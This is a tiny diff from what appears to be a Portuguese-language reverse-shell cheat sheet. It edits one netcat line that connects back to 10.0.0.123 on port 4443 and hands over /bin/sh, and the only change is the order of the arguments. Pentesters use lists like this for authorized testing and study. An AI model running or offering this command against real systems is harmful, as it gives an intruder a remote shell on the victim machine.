@@ -33,7 +33,7 @@ p.waitFor()`
 
 ## Netcat
 
-`nc -e /bin/sh 10.0.0.123 4443`
+`nc 10.0.0.123 4443 -e /bin/sh`
 
 ## Fonte:
 
